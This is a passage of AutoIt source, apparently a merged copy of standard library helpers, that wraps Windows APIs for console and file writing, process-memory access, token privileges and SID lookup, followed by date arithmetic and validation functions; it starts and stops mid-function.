	Local $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
	If @error Then Return SetError(@error, @extended, "")
	Local $tmultibyte = DllStructCreate("char[" & $aresult[0] & "]")
	$aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "struct*", $tmultibyte, "int", $aresult[0], "ptr", 0, "ptr", 0)
	If @error Then Return SetError(@error, @extended, "")
	If $bretstring Then Return DllStructGetData($tmultibyte, 1)
	Return $tmultibyte
EndFunc   ;==>_WinAPI_WideCharToMultiByte

Func _WinAPI_WindowFromPoint(ByRef $tpoint)
	Local $aresult = DllCall("user32.dll", "hwnd", "WindowFromPoint", "struct", $tpoint)
	If @error Then Return SetError(1, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WindowFromPoint

Func _WinAPI_WriteConsole($hconsole, $stext)
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteConsoleW", "handle", $hconsole, "wstr", $stext, "dword", StringLen($stext), "dword*", 0, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WriteConsole

Func _WinAPI_WriteFile($hfile, $pbuffer, $itowrite, ByRef $iwritten, $poverlapped = 0)
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteFile", "handle", $hfile, "ptr", $pbuffer, "dword", $itowrite, "dword*", 0, "ptr", $poverlapped)
	If @error Then Return SetError(@error, @extended, False)
	$iwritten = $aresult[4]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WriteFile

Func _WinAPI_WriteProcessMemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iwritten, $sbuffer = "ptr")
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, $sbuffer, $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	$iwritten = $aresult[5]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WriteProcessMemory

Func _Security__AdjustTokenPrivileges($htoken, $fdisableall, $pnewstate, $ibufferlen, $pprevstate = 0, $prequired = 0)
	Local $acall = DllCall("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $htoken, "bool", $fdisableall, "struct*", $pnewstate, "dword", $ibufferlen, "struct*", $pprevstate, "struct*", $prequired)
	If @error Then Return SetError(1, @extended, False)
	Return Not ($acall[0] = 0)
EndFunc   ;==>_Security__AdjustTokenPrivileges

Func _Security__CreateProcessWithToken($htoken, $ilogonflags, $scommandline, $icreationflags, $scurdir, $tstartupinfo, $tprocess_information)
	Local $acall = DllCall("advapi32.dll", "bool", "CreateProcessWithTokenW", "handle", $htoken, "dword", $ilogonflags, "ptr", 0, "wstr", $scommandline, "dword", $icreationflags, "struct*", 0, "wstr", $scurdir, "struct*", $tstartupinfo, "struct*", $tprocess_information)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, False)
	Return True
EndFunc   ;==>_Security__CreateProcessWithToken

Func _Security__DuplicateTokenEx($hexistingtoken, $idesiredaccess, $iimpersonationlevel, $itokentype)
	Local $acall = DllCall("advapi32.dll", "bool", "DuplicateTokenEx", "handle", $hexistingtoken, "dword", $idesiredaccess, "struct*", 0, "int", $iimpersonationlevel, "int", $itokentype, "handle*", 0)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, 0)
	Return $acall[6]
EndFunc   ;==>_Security__DuplicateTokenEx

Func _Security__GetAccountSid($saccount, $ssystem = "")
	Local $aacct = _Security__LookupAccountName($saccount, $ssystem)
	If @error Then Return SetError(@error, @extended, 0)
	If IsArray($aacct) Then Return _Security__StringSidToSid($aacct[0])
	Return ""
EndFunc   ;==>_Security__GetAccountSid

Func _Security__GetLengthSid($psid)
	If Not _Security__IsValidSid($psid) Then Return SetError(1, @extended, 0)
	Local $acall = DllCall("advapi32.dll", "dword", "GetLengthSid", "struct*", $psid)
	If @error Then Return SetError(2, @extended, 0)
	Return $acall[0]
EndFunc   ;==>_Security__GetLengthSid

Func _Security__GetTokenInformation($htoken, $iclass)
	Local $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", 0, "dword", 0, "dword*", 0)
	If @error Or Not $acall[5] Then Return SetError(1, @extended, 0)
	Local $ilen = $acall[5]
	Local $tbuffer = DllStructCreate("byte[" & $ilen & "]")
	$acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", $tbuffer, "dword", DllStructGetSize($tbuffer), "dword*", 0)
	If @error Or Not $acall[0] Then Return SetError(2, @extended, 0)
	Return $tbuffer
EndFunc   ;==>_Security__GetTokenInformation

Func _Security__ImpersonateSelf($ilevel = $securityimpersonation)
	Local $acall = DllCall("advapi32.dll", "bool", "ImpersonateSelf", "int", $ilevel)
	If @error Then Return SetError(1, @extended, False)
	Return Not ($acall[0] = 0)
EndFunc   ;==>_Security__ImpersonateSelf

Func _Security__IsValidSid($psid)
	Local $acall = DllCall("advapi32.dll", "bool", "IsValidSid", "struct*", $psid)
	If @error Then Return SetError(1, @extended, False)
	Return Not ($acall[0] = 0)
EndFunc   ;==>_Security__IsValidSid

Func _Security__LookupAccountName($saccount, $ssystem = "")
	Local $tdata = DllStructCreate("byte SID[256]")
	Local $acall = DllCall("advapi32.dll", "bool", "LookupAccountNameW", "wstr", $ssystem, "wstr", $saccount, "struct*", $tdata, "dword*", DllStructGetSize($tdata), "wstr", "", "dword*", DllStructGetSize($tdata), "int*", 0)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, 0)
	Local $aacct[3]
	$aacct[0] = _Security__SidToStringSid(DllStructGetPtr($tdata, "SID"))
	$aacct[1] = $acall[5]
	$aacct[2] = $acall[7]
	Return $aacct
EndFunc   ;==>_Security__LookupAccountName

Func _Security__LookupAccountSid($vsid, $ssystem = "")
	Local $psid, $aacct[3]
	If IsString($vsid) Then
		$psid = _Security__StringSidToSid($vsid)
	Else
		$psid = $vsid
	EndIf
	If Not _Security__IsValidSid($psid) Then Return SetError(1, @extended, 0)
	Local $typesystem = "ptr"
	If $ssystem Then $typesystem = "wstr"
	Local $acall = DllCall("advapi32.dll", "bool", "LookupAccountSidW", $typesystem, $ssystem, "struct*", $psid, "wstr", "", "dword*", 65536, "wstr", "", "dword*", 65536, "int*", 0)
	If @error Or Not $acall[0] Then Return SetError(2, @extended, 0)
	Local $aacct[3]
	$aacct[0] = $acall[3]
	$aacct[1] = $acall[5]
	$aacct[2] = $acall[7]
	Return $aacct
EndFunc   ;==>_Security__LookupAccountSid

Func _Security__LookupPrivilegeValue($ssystem, $sname)
	Local $acall = DllCall("advapi32.dll", "bool", "LookupPrivilegeValueW", "wstr", $ssystem, "wstr", $sname, "int64*", 0)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, 0)
	Return $acall[3]
EndFunc   ;==>_Security__LookupPrivilegeValue

Func _Security__OpenProcessToken($hprocess, $iaccess)
	Local $acall = DllCall("advapi32.dll", "bool", "OpenProcessToken", "handle", $hprocess, "dword", $iaccess, "handle*", 0)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, 0)
	Return $acall[3]
EndFunc   ;==>_Security__OpenProcessToken

Func _Security__OpenThreadToken($iaccess, $hthread = 0, $fopenasself = False)
	If $hthread = 0 Then $hthread = _WinAPI_GetCurrentThread()
	If @error Then Return SetError(1, @extended, 0)
	Local $acall = DllCall("advapi32.dll", "bool", "OpenThreadToken", "handle", $hthread, "dword", $iaccess, "bool", $fopenasself, "handle*", 0)
	If @error Or Not $acall[0] Then Return SetError(2, @extended, 0)
	Return $acall[4]
EndFunc   ;==>_Security__OpenThreadToken

Func _Security__OpenThreadTokenEx($iaccess, $hthread = 0, $fopenasself = False)
	Local $htoken = _Security__OpenThreadToken($iaccess, $hthread, $fopenasself)
	If $htoken = 0 Then
		$htoken = _Security__OpenThreadToken($iaccess, $hthread, $fopenasself)
	EndIf
	Return $htoken
EndFunc   ;==>_Security__OpenThreadTokenEx

Func _Security__SetPrivilege($htoken, $sprivilege, $fenable)
	Local $iluid = _Security__LookupPrivilegeValue("", $sprivilege)
	If $iluid = 0 Then Return SetError(1, @extended, False)
	Local $tcurrstate = DllStructCreate($tagtoken_privileges)
	Local $icurrstate = DllStructGetSize($tcurrstate)
	Local $tprevstate = DllStructCreate($tagtoken_privileges)
	Local $iprevstate = DllStructGetSize($tprevstate)
	Local $trequired = DllStructCreate("int Data")
	DllStructSetData($tcurrstate, "Count", 1)
	DllStructSetData($tcurrstate, "LUID", $iluid)
	If Not _Security__AdjustTokenPrivileges($htoken, False, $tcurrstate, $icurrstate, $tprevstate, $trequired) Then Return SetError(2, @error, False)
	DllStructSetData($tprevstate, "Count", 1)
	DllStructSetData($tprevstate, "LUID", $iluid)
	Local $iattributes = DllStructGetData($tprevstate, "Attributes")
	If $fenable Then
		$iattributes = BitOR($iattributes, $se_privilege_enabled)
	Else
		$iattributes = BitAND($iattributes, BitNOT($se_privilege_enabled))
	EndIf
	DllStructSetData($tprevstate, "Attributes", $iattributes)
	If Not _Security__AdjustTokenPrivileges($htoken, False, $tprevstate, $iprevstate, $tcurrstate, $trequired) Then Return SetError(3, @error, False)
	Return True
EndFunc   ;==>_Security__SetPrivilege

Func _Security__SetTokenInformation($htoken, $itokeninformation, $vtokeninformation, $itokeninformationlength)
	Local $acall = DllCall("advapi32.dll", "bool", "SetTokenInformation", "handle", $htoken, "int", $itokeninformation, "struct*", $vtokeninformation, "dword", $itokeninformationlength)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, False)
	Return True
EndFunc   ;==>_Security__SetTokenInformation

Func _Security__SidToStringSid($psid)
	If Not _Security__IsValidSid($psid) Then Return SetError(1, 0, "")
	Local $acall = DllCall("advapi32.dll", "bool", "ConvertSidToStringSidW", "struct*", $psid, "ptr*", 0)
	If @error Or Not $acall[0] Then Return SetError(2, @extended, "")
	Local $pstringsid = $acall[2]
	Local $ssid = DllStructGetData(DllStructCreate("wchar Text[" & _WinAPI_StringLenW($pstringsid) + 1 & "]", $pstringsid), "Text")
	_WinAPI_LocalFree($pstringsid)
	Return $ssid
EndFunc   ;==>_Security__SidToStringSid

Func _Security__SidTypeStr($itype)
	Switch $itype
		Case $sidtypeuser
			Return "User"
		Case $sidtypegroup
			Return "Group"
		Case $sidtypedomain
			Return "Domain"
		Case $sidtypealias
			Return "Alias"
		Case $sidtypewellknowngroup
			Return "Well Known Group"
		Case $sidtypedeletedaccount
			Return "Deleted Account"
		Case $sidtypeinvalid
			Return "Invalid"
		Case $sidtypeunknown
			Return "Unknown Type"
		Case $sidtypecomputer
			Return "Computer"
		Case $sidtypelabel
			Return "A mandatory integrity label SID"
		Case Else
			Return "Unknown SID Type"
	EndSwitch
EndFunc   ;==>_Security__SidTypeStr

Func _Security__StringSidToSid($ssid)
	Local $acall = DllCall("advapi32.dll", "bool", "ConvertStringSidToSidW", "wstr", $ssid, "ptr*", 0)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, 0)
	Local $psid = $acall[2]
	Local $tbuffer = DllStructCreate("byte Data[" & _Security__GetLengthSid($psid) & "]", $psid)
	Local $tsid = DllStructCreate("byte Data[" & DllStructGetSize($tbuffer) & "]")
	DllStructSetData($tsid, "Data", DllStructGetData($tbuffer, "Data"))
	_WinAPI_LocalFree($psid)
	Return $tsid
EndFunc   ;==>_Security__StringSidToSid

Global Const $tagmemmap = "handle hProc;ulong_ptr Size;ptr Mem"

Func _memfree(ByRef $tmemmap)
	Local $pmemory = DllStructGetData($tmemmap, "Mem")
	Local $hprocess = DllStructGetData($tmemmap, "hProc")
	Local $bresult = _MemVirtualFreeEx($hprocess, $pmemory, 0, $mem_release)
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess)
	If @error Then Return SetError(@error, @extended, False)
	Return $bresult
EndFunc   ;==>_memfree

Func _MemGlobalAlloc($ibytes, $iflags = 0)
	Local $aresult = DllCall("kernel32.dll", "handle", "GlobalAlloc", "uint", $iflags, "ulong_ptr", $ibytes)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_MemGlobalAlloc

Func _MemGlobalFree($hmem)
	Local $aresult = DllCall("kernel32.dll", "ptr", "GlobalFree", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_MemGlobalFree

Func _MemGlobalLock($hmem)
	Local $aresult = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_MemGlobalLock

Func _MemGlobalSize($hmem)
	Local $aresult = DllCall("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_MemGlobalSize

Func _MemGlobalUnlock($hmem)
	Local $aresult = DllCall("kernel32.dll", "bool", "GlobalUnlock", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_MemGlobalUnlock

Func _meminit($hwnd, $isize, ByRef $tmemmap)
	Local $aresult = DllCall("User32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Local $iprocessid = $aresult[2]
	If $iprocessid = 0 Then Return SetError(1, 0, 0)
	Local $iaccess = BitOR($process_vm_operation, $process_vm_read, $process_vm_write)
	Local $hprocess = __mem_openprocess($iaccess, False, $iprocessid, True)
	Local $ialloc = BitOR($mem_reserve, $mem_commit)
	Local $pmemory = _MemVirtualAllocEx($hprocess, 0, $isize, $ialloc, $page_readwrite)
	If $pmemory = 0 Then Return SetError(2, 0, 0)
	$tmemmap = DllStructCreate($tagmemmap)
	DllStructSetData($tmemmap, "hProc", $hprocess)
	DllStructSetData($tmemmap, "Size", $isize)
	DllStructSetData($tmemmap, "Mem", $pmemory)
	Return $pmemory
EndFunc   ;==>_meminit

Func _MemMoveMemory($psource, $pdest, $ilength)
	DllCall("kernel32.dll", "none", "RtlMoveMemory", "struct*", $pdest, "struct*", $psource, "ulong_ptr", $ilength)
	If @error Then Return SetError(@error, @extended)
EndFunc   ;==>_MemMoveMemory

Func _memread(ByRef $tmemmap, $psrce, $pdest, $isize)
	Local $aresult = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", DllStructGetData($tmemmap, "hProc"), "ptr", $psrce, "struct*", $pdest, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_memread

Func _memwrite(ByRef $tmemmap, $psrce, $pdest = 0, $isize = 0, $ssrce = "struct*")
	If $pdest = 0 Then $pdest = DllStructGetData($tmemmap, "Mem")
	If $isize = 0 Then $isize = DllStructGetData($tmemmap, "Size")
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", DllStructGetData($tmemmap, "hProc"), "ptr", $pdest, $ssrce, $psrce, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_memwrite

Func _MemVirtualAlloc($paddress, $isize, $iallocation, $iprotect)
	Local $aresult = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", $paddress, "ulong_ptr", $isize, "dword", $iallocation, "dword", $iprotect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_MemVirtualAlloc

Func _MemVirtualAllocEx($hprocess, $paddress, $isize, $iallocation, $iprotect)
	Local $aresult = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", "handle", $hprocess, "ptr", $paddress, "ulong_ptr", $isize, "dword", $iallocation, "dword", $iprotect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_MemVirtualAllocEx

Func _MemVirtualFree($paddress, $isize, $ifreetype)
	Local $aresult = DllCall("kernel32.dll", "bool", "VirtualFree", "ptr", $paddress, "ulong_ptr", $isize, "dword", $ifreetype)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_MemVirtualFree

Func _MemVirtualFreeEx($hprocess, $paddress, $isize, $ifreetype)
	Local $aresult = DllCall("kernel32.dll", "bool", "VirtualFreeEx", "handle", $hprocess, "ptr", $paddress, "ulong_ptr", $isize, "dword", $ifreetype)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_MemVirtualFreeEx

Func __mem_openprocess($iaccess, $finherit, $iprocessid, $fdebugpriv = False)
	Local $aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $finherit, "dword", $iprocessid)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return $aresult[0]
	If Not $fdebugpriv Then Return 0
	Local $htoken = _Security__OpenThreadTokenEx(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error, @extended, 0)
	_Security__SetPrivilege($htoken, "SeDebugPrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $iret = 0
	If Not @error Then
		$aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $finherit, "dword", $iprocessid)
		$ierror = @error
		$ilasterror = @extended
		If $aresult[0] Then $iret = $aresult[0]
		_Security__SetPrivilege($htoken, "SeDebugPrivilege", False)
		If @error Then
			$ierror = @error
			$ilasterror = @extended
		EndIf
	EndIf
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $htoken)
	Return SetError($ierror, $ilasterror, $iret)
EndFunc   ;==>__mem_openprocess

Func _DateAdd($stype, $ivaltoadd, $sdate)
	Local $astimepart[4]
	Local $asdatepart[4]
	Local $ijuliandate
	$stype = StringLeft($stype, 1)
	If StringInStr("D,M,Y,w,h,n,s", $stype) = 0 Or $stype = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If Not StringIsInt($ivaltoadd) Then
		Return SetError(2, 0, 0)
	EndIf
	If Not _DateIsValid($sdate) Then
		Return SetError(3, 0, 0)
	EndIf
	_DateTimeSplit($sdate, $asdatepart, $astimepart)
	If $stype = "d" Or $stype = "w" Then
		If $stype = "w" Then $ivaltoadd = $ivaltoadd * 7
		$ijuliandate = _DateToDayValue($asdatepart[1], $asdatepart[2], $asdatepart[3]) + $ivaltoadd
		_DayValueToDate($ijuliandate, $asdatepart[1], $asdatepart[2], $asdatepart[3])
	EndIf
	If $stype = "m" Then
		$asdatepart[2] = $asdatepart[2] + $ivaltoadd
		While $asdatepart[2] > 12
			$asdatepart[2] = $asdatepart[2] - 12
			$asdatepart[1] = $asdatepart[1] + 1
		WEnd
		While $asdatepart[2] < 1
			$asdatepart[2] = $asdatepart[2] + 12
			$asdatepart[1] = $asdatepart[1] - 1
		WEnd
	EndIf
	If $stype = "y" Then
		$asdatepart[1] = $asdatepart[1] + $ivaltoadd
	EndIf
	If $stype = "h" Or $stype = "n" Or $stype = "s" Then
		Local $itimeval = _TimeToTicks($astimepart[1], $astimepart[2], $astimepart[3]) / 1000
		If $stype = "h" Then $itimeval = $itimeval + $ivaltoadd * 3600
		If $stype = "n" Then $itimeval = $itimeval + $ivaltoadd * 60
		If $stype = "s" Then $itimeval = $itimeval + $ivaltoadd
		Local $day2add = Int($itimeval / (24 * 60 * 60))
		$itimeval = $itimeval - $day2add * 24 * 60 * 60
		If $itimeval < 0 Then
			$day2add = $day2add - 1
			$itimeval = $itimeval + 24 * 60 * 60
		EndIf
		$ijuliandate = _DateToDayValue($asdatepart[1], $asdatepart[2], $asdatepart[3]) + $day2add
		_DayValueToDate($ijuliandate, $asdatepart[1], $asdatepart[2], $asdatepart[3])
		_TicksToTime($itimeval * 1000, $astimepart[1], $astimepart[2], $astimepart[3])
	EndIf
	Local $inumdays = _daysinmonth($asdatepart[1])
	If $inumdays[$asdatepart[2]] < $asdatepart[3] Then $asdatepart[3] = $inumdays[$asdatepart[2]]
	$sdate = $asdatepart[1] & "/" & StringRight("0" & $asdatepart[2], 2) & "/" & StringRight("0" & $asdatepart[3], 2)
	If $astimepart[0] > 0 Then
		If $astimepart[0] > 2 Then
			$sdate = $sdate & " " & StringRight("0" & $astimepart[1], 2) & ":" & StringRight("0" & $astimepart[2], 2) & ":" & StringRight("0" & $astimepart[3], 2)
		Else
			$sdate = $sdate & " " & StringRight("0" & $astimepart[1], 2) & ":" & StringRight("0" & $astimepart[2], 2)
		EndIf
	EndIf
	Return ($sdate)
EndFunc   ;==>_DateAdd

Func _DateDayOfWeek($idaynum, $ishort = 0)
	Local Const $adayofweek[8] = ["", "Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]
	Select
		Case Not StringIsInt($idaynum) Or Not StringIsInt($ishort)
			Return SetError(1, 0, "")
		Case $idaynum < 1 Or $idaynum > 7
			Return SetError(1, 0, "")
		Case Else
			Select
				Case $ishort = 0
					Return $adayofweek[$idaynum]
				Case $ishort = 1
					Return StringLeft($adayofweek[$idaynum], 3)
				Case Else
					Return SetError(1, 0, "")
			EndSelect
	EndSelect
EndFunc   ;==>_DateDayOfWeek

Func _DateDaysInMonth($iyear, $imonthnum)
	If __dateismonth($imonthnum) And __dateisyear($iyear) Then
		Local $ainumdays = _daysinmonth($iyear)
		Return $ainumdays[$imonthnum]
	EndIf
	Return SetError(1, 0, 0)
EndFunc   ;==>_DateDaysInMonth

Func _DateDiff($stype, $sstartdate, $senddate)
	$stype = StringLeft($stype, 1)
	If StringInStr("d,m,y,w,h,n,s", $stype) = 0 Or $stype = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If Not _DateIsValid($sstartdate) Then
		Return SetError(2, 0, 0)
	EndIf
	If Not _DateIsValid($senddate) Then
		Return SetError(3, 0, 0)
	EndIf
	Local $asstartdatepart[4], $asstarttimepart[4], $asenddatepart[4], $asendtimepart[4]
	_DateTimeSplit($sstartdate, $asstartdatepart, $asstarttimepart)
	_DateTimeSplit($senddate, $asenddatepart, $asendtimepart)
	Local $adaysdiff = _DateToDayValue($asenddatepart[1], $asenddatepart[2], $asenddatepart[3]) - _DateToDayValue($asstartdatepart[1], $asstartdatepart[2], $asstartdatepart[3])
	Local $itimediff, $iyeardiff, $istarttimeinsecs, $iendtimeinsecs
	If $asstarttimepart[0] > 1 And $asendtimepart[0] > 1 Then
		$istarttimeinsecs = $asstarttimepart[1] * 3600 + $asstarttimepart[2] * 60 + $asstarttimepart[3]
		$iendtimeinsecs = $asendtimepart[1] * 3600 + $asendtimepart[2] * 60 + $asendtimepart[3]
		$itimediff = $iendtimeinsecs - $istarttimeinsecs
		If $itimediff < 0 Then
			$adaysdiff = $adaysdiff - 1
			$itimediff = $itimediff + 24 * 60 * 60
		EndIf
	Else
		$itimediff = 0
	EndIf
	Select
		Case $stype = "d"
			Return ($adaysdiff)
		Case $stype = "m"
			$iyeardiff = $asenddatepart[1] - $asstartdatepart[1]
			Local $imonthdiff = $asenddatepart[2] - $asstartdatepart[2] + $iyeardiff * 12
			If $asenddatepart[3] < $asstartdatepart[3] Then $imonthdiff = $imonthdiff - 1
			$istarttimeinsecs = $asstarttimepart[1] * 3600 + $asstarttimepart[2] * 60 + $asstarttimepart[3]
			$iendtimeinsecs = $asendtimepart[1] * 3600 + $asendtimepart[2] * 60 + $asendtimepart[3]
			$itimediff = $iendtimeinsecs - $istarttimeinsecs
			If $asenddatepart[3] = $asstartdatepart[3] And $itimediff < 0 Then $imonthdiff = $imonthdiff - 1
			Return ($imonthdiff)
		Case $stype = "y"
			$iyeardiff = $asenddatepart[1] - $asstartdatepart[1]
			If $asenddatepart[2] < $asstartdatepart[2] Then $iyeardiff = $iyeardiff - 1
			If $asenddatepart[2] = $asstartdatepart[2] And $asenddatepart[3] < $asstartdatepart[3] Then $iyeardiff = $iyeardiff - 1
			$istarttimeinsecs = $asstarttimepart[1] * 3600 + $asstarttimepart[2] * 60 + $asstarttimepart[3]
			$iendtimeinsecs = $asendtimepart[1] * 3600 + $asendtimepart[2] * 60 + $asendtimepart[3]
			$itimediff = $iendtimeinsecs - $istarttimeinsecs
			If $asenddatepart[2] = $asstartdatepart[2] And $asenddatepart[3] = $asstartdatepart[3] And $itimediff < 0 Then $iyeardiff = $iyeardiff - 1
			Return ($iyeardiff)
		Case $stype = "w"
			Return (Int($adaysdiff / 7))
		Case $stype = "h"
			Return ($adaysdiff * 24 + Int($itimediff / 3600))
		Case $stype = "n"
			Return ($adaysdiff * 24 * 60 + Int($itimediff / 60))
		Case $stype = "s"
			Return ($adaysdiff * 24 * 60 * 60 + $itimediff)
	EndSelect
EndFunc   ;==>_DateDiff

Func _DateIsLeapYear($iyear)
	If StringIsInt($iyear) Then
		Select
			Case Mod($iyear, 4) = 0 And Mod($iyear, 100) <> 0
				Return 1
			Case Mod($iyear, 400) = 0
				Return 1
			Case Else
				Return 0
		EndSelect
	EndIf
	Return SetError(1, 0, 0)
EndFunc   ;==>_DateIsLeapYear

Func __dateismonth($inumber)
	If StringIsInt($inumber) Then
		If $inumber >= 1 And $inumber <= 12 Then
			Return 1
		Else
			Return 0
		EndIf
	EndIf
	Return 0
EndFunc   ;==>__dateismonth

Func _DateIsValid($sdate)
	Local $asdatepart[4], $astimepart[4]
	Local $sdatetime = StringSplit($sdate, " T")
	If $sdatetime[0] > 0 Then $asdatepart = StringSplit($sdatetime[1], "/-.")
	If UBound($asdatepart) <> 4 Then Return (0)
	If $asdatepart[0] <> 3 Then Return (0)
	If Not StringIsInt($asdatepart[1]) Then Return (0)
	If Not StringIsInt($asdatepart[2]) Then Return (0)
	If Not StringIsInt($asdatepart[3]) Then Return (0)
	$asdatepart[1] = Number($asdatepart[1])
	$asdatepart[2] = Number($asdatepart[2])
	$asdatepart[3] = Number($asdatepart[3])
	Local $inumdays = _daysinmonth($asdatepart[1])
	If $asdatepart[1] < 1000 Or $asdatepart[1] > 2999 Then Return (0)
	If $asdatepart[2] < 1 Or $asdatepart[2] > 12 Then Return (0)
	If $asdatepart[3] < 1 Or $asdatepart[3] > $inumdays[$asdatepart[2]] Then Return (0)
	If $sdatetime[0] > 1 Then
		$astimepart = StringSplit($sdatetime[2], ":")
		If UBound($astimepart) < 4 Then ReDim $astimepart[4]
	Else
		Dim $astimepart[4]
	EndIf
	If $astimepart[0] < 1 Then Return (1)
	If $astimepart[0] < 2 Then Return (0)
	If $astimepart[0] = 2 Then $astimepart[3] = "00"
	If Not StringIsInt($astimepart[1]) Then Return (0)
	If Not StringIsInt($astimepart[2]) Then Return (0)
	If Not StringIsInt($astimepart[3]) Then Return (0)
	$astimepart[1] = Number($astimepart[1])
	$astimepart[2] = Number($astimepart[2])
	$astimepart[3] = Number($astimepart[3])
	If $astimepart[1] < 0 Or $astimepart[1] > 23 Then Return (0)
	If $astimepart[2] < 0 Or $astimepart[2] > 59 Then Return (0)
	If $astimepart[3] < 0 Or $astimepart[3] > 59 Then Return (0)
	Return 1
EndFunc   ;==>_DateIsValid

Func __dateisyear($inumber)
	If StringIsInt($inumber) Then
		If StringLen($inumber) = 4 Then
			Return 1
		Else
			Return 0
		EndIf
	EndIf
	Return 0
EndFunc   ;==>__dateisyear

Func _datelastweekdaynum($iweekdaynum)
	Select
		Case Not StringIsInt($iweekdaynum)
			Return SetError(1, 0, 0)
		Case $iweekdaynum < 1 Or $iweekdaynum > 7
			Return SetError(1, 0, 0)
		Case Else
			Local $ilastweekdaynum
			If $iweekdaynum = 1 Then
				$ilastweekdaynum = 7
			Else
				$ilastweekdaynum = $iweekdaynum - 1
			EndIf
			Return $ilastweekdaynum
	EndSelect
EndFunc   ;==>_datelastweekdaynum

Func _datelastmonthnum($imonthnum)
	Select
		Case Not StringIsInt($imonthnum)
			Return SetError(1, 0, 0)
		Case $imonthnum < 1 Or $imonthnum > 12
			Return SetError(1, 0, 0)
		Case Else
			Local $ilastmonthnum
			If $imonthnum = 1 Then
				$ilastmonthnum = 12
			Else
				$ilastmonthnum = $imonthnum - 1
			EndIf
			$ilastmonthnum = StringFormat("%02d", $ilastmonthnum)
			Return $ilastmonthnum
	EndSelect
EndFunc   ;==>_datelastmonthnum

Func _datelastmonthyear($imonthnum, $iyear)
	Select
		Case Not StringIsInt($imonthnum) Or Not StringIsInt($iyear)
			Return SetError(1, 0, 0)
		Case $imonthnum < 1 Or $imonthnum > 12
			Return SetError(1, 0, 0)
		Case Else
			Local $ilastyear
			If $imonthnum = 1 Then
				$ilastyear = $iyear - 1
			Else
				$ilastyear = $iyear
			EndIf
			$ilastyear = StringFormat("%04d", $ilastyear)
			Return $ilastyear
	EndSelect
EndFunc   ;==>_datelastmonthyear

Func _datenextweekdaynum($iweekdaynum)
	Select
		Case Not StringIsInt($iweekdaynum)
			Return SetError(1, 0, 0)
		Case $iweekdaynum < 1 Or $iweekdaynum > 7
			Return SetError(1, 0, 0)
		Case Else
			Local $inextweekdaynum
			If $iweekdaynum = 7 Then
				$inextweekdaynum = 1
			Else
				$inextweekdaynum = $iweekdaynum + 1
			EndIf
			Return $inextweekdaynum
	EndSelect
EndFunc   ;==>_datenextweekdaynum

Func _datenextmonthnum($imonthnum)
	Select
		Case Not StringIsInt($imonthnum)
			Return SetError(1, 0, 0)
		Case $imonthnum < 1 Or $imonthnum > 12
			Return SetError(1, 0, 0)
		Case Else
			Local $inextmonthnum
			If $imonthnum = 12 Then
				$inextmonthnum = 1
			Else
				$inextmonthnum = $imonthnum + 1
			EndIf
			$inextmonthnum = StringFormat("%02d", $inextmonthnum)
			Return $inextmonthnum
